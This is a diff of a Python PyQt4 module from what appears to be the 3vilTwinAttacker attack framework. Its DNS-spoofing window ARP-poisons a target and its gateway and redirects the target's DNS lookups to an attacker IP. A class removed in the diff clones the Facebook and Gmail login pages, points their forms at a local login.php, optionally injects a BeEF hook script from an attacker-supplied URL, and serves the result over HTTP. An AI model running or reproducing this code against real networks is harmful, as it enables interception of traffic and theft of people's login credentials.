@@ -18,15 +18,15 @@ from PyQt4.QtGui import *
 from PyQt4.QtCore import *
 from Core.Settings import frm_Settings
 from Modules.ModuleUpdateFake import frm_update_attack
-from Modules.utils import ProcessThread,Refactor,Beef_Hook_url,ThDnsSpoofAttack,ThARP_posion
+from Modules.utils import Refactor,ThSpoofAttack,ThARP_posion
 from Modules.ModuleArpPosion import ThreadScan
-from os import popen,chdir,getcwd,devnull,system
+from Modules.ModuleTemplates import frm_template
+from os import popen,chdir,getcwd,devnull
 from scapy.all import *
 import threading
-from urllib2 import urlopen,URLError
 from multiprocessing import Process,Manager
 from socket import gaierror
-from subprocess import Popen,PIPE,STDOUT
+from subprocess import Popen,PIPE
 from re import search
 threadloading = {'template':[],'dnsspoof':[],'arps':[]}
 
@@ -66,8 +66,8 @@ class frm_DnsSpoof(QWidget):
                     i.stop(),i.join()
                     threadloading['template'] = []
                 self.deleteLater()
-            else:
-                event.ignore()
+                return
+            event.ignore()
 
     def loadtheme(self,theme):
         sshFile=("Core/%s.qss"%(theme))
@@ -75,12 +75,12 @@ class frm_DnsSpoof(QWidget):
             self.setStyleSheet(fh.read())
 
     def GUI(self):
-        self.form =QFormLayout()
-        self.layoutform = QFormLayout()
-        self.movie = QMovie('rsc/loading2.gif', QByteArray(), self)
-        size = self.movie.scaledSize()
+        self.form           = QFormLayout()
+        self.layoutform     = QFormLayout()
+        self.movie          = QMovie('rsc/loading2.gif', QByteArray(), self)
+        size                = self.movie.scaledSize()
+        self.movie_screen   = QLabel()
         self.setGeometry(200, 200, size.width(), size.height())
-        self.movie_screen = QLabel()
         self.movie_screen.setFixedHeight(200)
         self.movie_screen.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
         self.movie_screen.setAlignment(Qt.AlignCenter)
@@ -112,32 +112,16 @@ class frm_DnsSpoof(QWidget):
         self.txt_redirect = QLineEdit(self)
         self.txt_target = QLineEdit(self)
         self.ComboIface = QComboBox(self)
-        n = self.interfaces['all']
-        for i,j in enumerate(n):
-            if n[i] != '':
-                self.ComboIface.addItem(n[i])
+        self.connect(self.ComboIface, SIGNAL("currentIndexChanged(QString)"), self.discoveryIface)
+
         self.layoutform.addRow('Target:',self.txt_target)
         self.layoutform.addRow('gateway:',self.txt_gateway)
         self.layoutform.addRow('Redirect IP:',self.txt_redirect)
         self.layoutform.addRow('Range Scan:',self.ip_range)
         self.layoutform.addRow('Interface:',self.ComboIface)
         self.myListDns = QListWidget(self)
-        try:
-            items = [
-                'google.com:'+(str(Popen(['/bin/ping','-c1',
-                '-w100', 'google.com'], stdout=PIPE).stdout.read()).split()[2]).replace(')','').replace('(',''),
-                'facebook.com:'+(str(Popen(['/bin/ping','-c1',
-                '-w100', 'facebook.com'], stdout=PIPE).stdout.read()).split()[2]).replace(')','').replace('(',''),
-                'gmail.com:'+(str(Popen(['/bin/ping','-c1',
-                '-w100', 'gmail.com'], stdout=PIPE).stdout.read()).split()[2]).replace(')','').replace('(',''),
-            ]
-            for i in items:
-                item = QListWidgetItem()
-                item.setText(i)
-                item.setSizeHint(QSize(30,30))
-                self.myListDns.addItem(item)
-        except Exception:
-            pass
+        self.SettingsGUI()
+
         self.myListDns.setMinimumWidth(self.myListDns.sizeHintForColumn(100))
         self.myListDns.setContextMenuPolicy(Qt.CustomContextMenu)
         self.myListDns.connect(self.myListDns,
@@ -207,10 +191,6 @@ class frm_DnsSpoof(QWidget):
         self.grid2.addWidget(self.btn_Attack_Posion,1,0)
         self.grid2.addWidget(self.btn_Stop_Posion,1,5)
 
-        x  = self.interfaces
-        if x['gateway'] != None:
-            self.txt_gateway.setText(x['gateway'])
-            self.txt_redirect.setText(x['IPaddress'])
 
         self.form0  = QGridLayout()
         self.form0.addWidget(self.movie_screen,0,0)
@@ -228,6 +208,31 @@ class frm_DnsSpoof(QWidget):
         self.Main.addLayout(self.layout)
         self.Main.addLayout(self.form)
         self.setLayout(self.Main)
+
+    def SettingsGUI(self):
+        ifaces = self.interfaces
+        for i,j in enumerate(ifaces['all']):
+            if ifaces['all'][i] != '':
+                self.ComboIface.addItem(ifaces['all'][i])
+        if ifaces['gateway'] != None:
+            self.txt_gateway.setText(ifaces['gateway'])
+            self.txt_redirect.setText(ifaces['IPaddress'])
+        try:
+            items = [
+                'google.com:'+(str(Popen(['/bin/ping','-c1',
+                '-w100', 'google.com'], stdout=PIPE).stdout.read()).split()[2]).replace(')','').replace('(',''),
+                'facebook.com:'+(str(Popen(['/bin/ping','-c1',
+                '-w100', 'facebook.com'], stdout=PIPE).stdout.read()).split()[2]).replace(')','').replace('(',''),
+                'gmail.com:'+(str(Popen(['/bin/ping','-c1',
+                '-w100', 'gmail.com'], stdout=PIPE).stdout.read()).split()[2]).replace(')','').replace('(',''),
+            ]
+            for i in items:
+                item = QListWidgetItem()
+                item.setText(i)
+                item.setSizeHint(QSize(30,30))
+                self.myListDns.addItem(item)
+        except Exception:
+            pass
 
     def listItemclicked(self,pos):
         item = self.myListDns.selectedItems()
@@ -263,6 +268,12 @@ class frm_DnsSpoof(QWidget):
         elif action == clearitem:
             self.myListDns.clear()
 
+    def discoveryIface(self):
+        iface = str(self.ComboIface.currentText())
+        ip = Refactor.get_Ipaddr(iface)
+        self.txt_redirect.setText(ip)
+
+
     def thread_scan_reveice(self,info_ip):
         self.StatusMonitor(False,'stas_scan')
         self.movie_screen.setDisabled(False)
@@ -294,11 +305,11 @@ class frm_DnsSpoof(QWidget):
             self.StatusMonitor(True,'stas_phishing')
 
     def show_template_dialog(self):
-        self.j = frm_template()
-        self.connect(self.j,SIGNAL('Activated ( QString ) '), self.emit_template)
-        self.j.setWindowTitle('Templates Phishing Attack')
-        self.j.txt_redirect.setText(self.txt_redirect.text())
-        self.j.show()
+        self.FormTemplate = frm_template()
+        self.connect(self.FormTemplate,SIGNAL('Activated ( QString ) '), self.emit_template)
+        self.FormTemplate.setWindowTitle('Templates Phishing Attack')
+        self.FormTemplate.txt_redirect.setText(self.txt_redirect.text())
+        self.FormTemplate.show()
 
     def kill_attack(self):
         for i in self.ThreadDirc['dns_spoof']:
@@ -307,7 +318,7 @@ class frm_DnsSpoof(QWidget):
                 i.terminate()
             except:
                 pass
-        for i in threadloading['template']:i.stop(),i.join()
+        self.FormTemplate.killThread()
         for i in threadloading['arps']:i.stop()
         try:
             self.ThreadScanner.terminate()
@@ -354,19 +365,19 @@ class frm_DnsSpoof(QWidget):
                         self.targets[i.split(':')[0]] = (i.split(':')[1]).replace('\n','')
                     self.domains = []
                     Refactor.set_ip_forward(1)
-                    arp_target = ThARP_posion(str(self.txt_gateway.text()),str(self.txt_target.text()))
-                    arp_target.setName('Arp Posion:: [target]')
-                    arp_target.setDaemon(True)
+                    arp_target = ThARP_posion(str(self.txt_gateway.text()),str(self.txt_target.text()),
+                    get_if_hwaddr(str(self.ComboIface.currentText())))
+                    arp_target.setObjectName('Arp Posion:: [target]')
                     threadloading['arps'].append(arp_target)
                     arp_target.start()
 
-                    arp_gateway = ThARP_posion(str(self.txt_target.text()),str(self.txt_gateway.text()))
-                    arp_gateway.setName('Arp Posion:: [gateway]')
-                    arp_gateway.setDaemon(True)
+                    arp_gateway = ThARP_posion(str(self.txt_target.text()),str(self.txt_gateway.text()),
+                    get_if_hwaddr(str(self.ComboIface.currentText())))
+                    arp_gateway.setObjectName('Arp Posion:: [gateway]')
                     threadloading['arps'].append(arp_gateway)
                     arp_gateway.start()
 
-                    thr = ThDnsSpoofAttack(self.targets,
+                    thr = ThSpoofAttack(self.targets,
                     str(self.ComboIface.currentText()),'udp port 53',True,str(self.txt_redirect.text()))
                     thr.redirection()
                     self.connect(thr,SIGNAL('Activated ( QString ) '), self.StopArpAttack)
@@ -494,7 +505,6 @@ class frm_DnsSpoof(QWidget):
             self.txt_status_phishing.setText('[ OFF ]')
             self.txt_status_phishing.setStyleSheet('QLabel {  color : red; }')
 
-
     @pyqtSlot(QModelIndex)
     def list_clicked_scan(self, index):
         item = self.tables.selectedItems()
@@ -502,191 +512,3 @@ class frm_DnsSpoof(QWidget):
             self.txt_target.setText(item[0].text())
         else:
             self.txt_target.clear()
-
-class frm_template(QDialog):
-    def __init__(self, parent = None):
-        super(frm_template, self).__init__(parent)
-        self.label = QLabel()
-        self.Main = QVBoxLayout(self)
-        self.setGeometry(0, 0, 500, 100)
-        self.center()
-        self.control = None
-        self.owd = getcwd()
-        self.config = frm_Settings()
-        self.loadtheme(self.config.XmlThemeSelected())
-        global threadloading
-        self.gui_temp()
-
-    def loadtheme(self,theme):
-        sshFile=("Core/%s.qss"%(theme))
-        with open(sshFile,"r") as fh:
-            self.setStyleSheet(fh.read())
-
-    def center(self):
-        frameGm = self.frameGeometry()
-        centerPoint = QDesktopWidget().availableGeometry().center()
-        frameGm.moveCenter(centerPoint)
-        self.move(frameGm.topLeft())
-
-    def gui_temp(self):
-        self.frm0 = QFormLayout(self)
-        self.frm1 = QFormLayout(self)
-        self.check_face = QCheckBox('Facebook')
-        self.check_gmail = QCheckBox('Gmail')
-        self.check_route = QCheckBox('Router')
-        self.check_beef = QCheckBox('Beef')
-        self.check_custom = QCheckBox('Custom Phishing')
-        self.EditBeef = QLineEdit(self)
-        self.EditBeef.setEnabled(False)
-
-        self.txt_html = QTextEdit(self)
-        self.txt_html.setPlainText('<html>\n<head>\n<title>3vilTwinAttacker Phishing </title>'
-        '\n</head>\n<body>\n'
-        '\n<h3 align=\'center\'>3vilTwinAttacker Framework</h3>\n'
-        '\n<p align=\'center\'>this is demo Attack Redirect.</p>\n'
-        '\n</body>\n</html>')
-        self.txt_html.setEnabled(False)
-        # connect buton
-        self.check_face.clicked.connect(self.check_options)
-        self.check_gmail.clicked.connect(self.check_options)
-        self.check_route.clicked.connect(self.check_options)
-        self.check_beef.clicked.connect(self.check_options)
-        self.check_custom.clicked.connect(self.check_options)
-
-        self.txt_redirect =  QLineEdit(self)
-        self.btn_start_template = QPushButton('Start Server HTTP')
-        self.btn_start_template.clicked.connect(self.start_server)
-
-        self.frm0.addRow(self.check_face)
-        self.frm0.addRow(self.check_gmail)
-        self.frm0.addRow(self.check_route)
-        self.frm0.addRow(self.check_custom)
-        h = QFrame(self)
-        h.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
-        self.frm0.addRow(h)
-        self.frm0.addRow(self.check_beef)
-        self.frm0.addRow(QLabel('IP Redirect:'),self.txt_redirect)
-        self.frm0.addRow("Beef Hook URL:",self.EditBeef)
-        self.frm0.addRow(self.btn_start_template)
-
-        layout = QHBoxLayout()
-        layout.addWidget(self.txt_html)
-        layout.addLayout(self.frm0)
-
-        self.Main.addLayout(layout)
-        self.setLayout(self.Main)
-
-    def start_server(self):
-        sock = None
-        if self.check_face.isChecked():
-            url = 'http://facebook.com'
-            try:
-                sock = urlopen(url).read()
-                self.control = 'facebook'
-            except URLError, e:
-                QMessageBox.information(self,'Error',"Server not found, can't find the server at focebook." + str(e))
-        elif self.check_gmail.isChecked():
-            try:
-                sock = urlopen('http://accounts.google.com/Login?hl').read()
-                self.control = 'gmail'
-            except URLError,e:
-                QMessageBox.information(self,'Error',"Server not found, can't find the server at google." + str(e))
-        elif self.check_route.isChecked():
-            self.control = 'route'
-        elif self.check_custom.isChecked():
-            self.control = 'custom'
-        else:
-            QMessageBox.information(self,'Error','checkbox not checked.')
-
-        if self.control != None:
-            self.phishing_page(self.control,sock)
-            if not len(threadloading['template']) == 0:
-                self.deleteLater()
-
-
-    def phishing_page(self,choice,sock):
-            if choice == 'facebook':
-                path = 'Modules/Phishing/Facebook/'
-                try:
-                    chdir(path)
-                except OSError,e:
-                    return None
-                self.html = sock.replace('https://www.facebook.com/login.php?login_attempt=1', 'login.php')
-                if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
-                    self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
-                    html_final = Beef_Hook_url(self.html,self.hook)
-                    if html_final != None:
-                        self.html = html_final
-                    else: QMessageBox.information(self,'Error Hook Inject Page',
-                        'Hook Url not injected, not found tag "<body>"')
-                with open('index.html','w') as f:
-                    f.write(str(self.html))
-                    f.close()
-            elif choice == 'route':
-                path = 'Modules/Phishing/Route/'
-                chdir(path)
-            elif choice == 'custom':
-                path = 'Modules/Phishing/Custom/'
-                chdir(path)
-                self.html = self.txt_html.toPlainText()
-                if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
-                    self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
-                    html_final = Beef_Hook_url(self.html,self.hook)
-                    if html_final != None:
-                        self.html = html_final
-                    else: QMessageBox.information(self,'Error Hook Inject Page',
-                        'Hook Url not injected, not found tag <body>')
-                with open('index.html','w') as f:
-                    f.write(str(self.html))
-                    f.close()
-            elif choice == 'gmail':
-                path = 'Modules/Phishing/Gmail/'
-                try:
-                    chdir(path)
-                    request = urlopen('http://accounts.google.com/Login?hl').read()
-                    self.html = request.replace('//ssl.gstatic.com/accounts/ui/','')
-                    self.html = request.replace('https://accounts.google.com/ServiceLoginAuth','login.php')
-                    if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
-                        self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
-                        html_final = Beef_Hook_url(self.html,self.hook)
-                        if html_final != None:
-                            self.html = html_final
-                        else: QMessageBox.information(self,'Error Hook Inject Page',
-                            'Hook Url not injected, not found tag "<body>"')
-                    with open('index.html','w') as f:
-                        f.write(str(self.html))
-                        f.close()
-                except OSError,e:
-                    return None
-
-            ip = str(self.txt_redirect.text())
-            popen('service apache2 stop')
-            if ip != None:
-                Tphishing = ProcessThread(['php', '-S',ip+':80'])
-                Tphishing.setName('Phishing:'+choice)
-                threadloading['template'].append(Tphishing)
-                Tphishing.start()
-                self.emit(SIGNAL('Activated( QString )'),'started')
-            else:
-                QMessageBox.information(self,'Connection','Ipaddress not found')
-
-    @pyqtSlot(QModelIndex)
-    def check_options(self,index):
-        if self.check_face.isChecked():
-            self.check_route.setChecked(False)
-            self.check_gmail.setChecked(False)
-        elif self.check_gmail.isChecked():
-            self.check_face.setChecked(False)
-            self.check_route.setChecked(False)
-        else:
-            self.check_face.setChecked(False)
-            self.check_gmail.setChecked(False)
-
-        if self.check_custom.isChecked():
-            self.txt_html.setEnabled(True)
-        else:
-            self.txt_html.setEnabled(False)
-        if self.check_beef.isChecked():
-            self.EditBeef.setEnabled(True)
-        else:
-            self.EditBeef.setEnabled(False)
